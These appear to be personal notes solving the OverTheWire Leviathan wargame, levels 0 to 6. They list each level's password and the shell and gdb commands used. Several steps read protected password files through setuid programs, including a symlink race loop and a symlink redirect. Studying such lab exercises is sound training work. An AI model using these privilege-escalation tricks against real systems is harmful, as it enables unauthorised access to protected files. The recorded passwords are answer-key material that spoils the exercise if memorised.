

Data for the levels can be found in the homedirectories. 
You can look at /etc/leviathan_pass for the various level passwords.
ssh leviathan0@leviathan.labs.overthewire.org -p 2223


		Username		Password

level 0		leviathan0		leviathan0

level 1		leviathan1		3QJ3TgzHDq
command ==> grep -i -n "password" ./.backup/bookmarks.html 

level 2 	leviathan2		NsN1HwFoyN
Note: Run check program and enter "sex" as password. (Luckily,  I figured it out by cat check command)
then it elevates your privilege as leviathan2 user. then run following:
command ==> cat /etc/leviathan_pass/leviathan2

level 3		leviathan3		f0n8h2iWLP
Note: A race condition exploit  is used to bypass the program's security checks. We create a symbolic link named link that initially points to a harmless decoy file. A background process rapidly and continuously changes what the link points to. In the split second after the program checks the harmless file path but before it opens the file, the background process swaps the symlink to point to the password file.
		Why It Works and Fails
			When it works: The printfile program checks the link when it's pointing to the harmless decoy file. The check passes. In the minuscule amount of time it takes to move on to the next step, your while loop switches the link to point to the password file. The program then opens the file (which is now /etc/leviathan_pass/leviathan3) and prints the password to your screen. You won the race.

			When it fails: The printfile program checks the link when it's pointing to the password file (/etc/leviathan_pass/leviathan3). The check fails because the program detects that the path is to a forbidden directory. It then exits with the You cant have that file... error. You lost the race.
commands ==>
		$cd /tmp
		$echo "This is a decoy file." > decoy
		$ln -s decoy link
		$(while true; do ln -sf /etc/leviathan_pass/leviathan3 link; ln -sf decoy link; done) & /home/leviathan2/printfile link

level 4 	leviathan4		WG1egElCvO
Note:	This level3 program will give access to shell with elevated permission as leviathan4.
	1) open the program level3 with gdb:
		$gdb ./level3
	2) (gdb)info functions
	3) (gdb)disassemble do_stuff
	4) Inside the assembly, notice some movl $0x... instructions writing hex values into memory. These are not random numbers, but ASCII characters stored in little-endian order.
	5) Check each value and converted to text:
		0x706c6e73 → "snlp"
		0x746e6972 → "rint"
		0x000a6674 → "tf\n"

	password for level3 program is "snlprintf"

command ==> cat /etc/leviathan_pass/leviathan4


level 5		leviathan5		0dyxT7F4QD
Note: find the .trash directory and you will find bin program inside it.
	this is the output of ./bin command from inside ~/.trash directory:
		00110000 01100100 01111001 01111000 01010100 00110111 01000110 00110100 01010001 01000100 00001010 
convert these binary values into ASCII equivalent characters:

command ==> python3 -c "print(''.join([chr(int(b, 2)) for b in '00110000 01100100 01111001 01111000 01010100 00110111 01000110 00110100 01010001 01000100'.split()]))"


level 6		leviathan6		szo7HDB88w
Note: 	The vulnerability is simple: the program will open whatever file is at that path, 
	even if it's not the file it was designed to open.
	The most elegant and direct solution is to use a symbolic link.  This is a special type of file that points to another file. We can create a symbolic link at /tmp/file.log that points to the leviathan6 password file. 
	When the leviathan5 executable tries to open /tmp/file.log, it will follow the link and open the password file with its elevated permissions. 
	Since leviathan5 is owned by leviathan6, it has permission to read the password file.	
command ==> ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
command ==> ./leviathan5
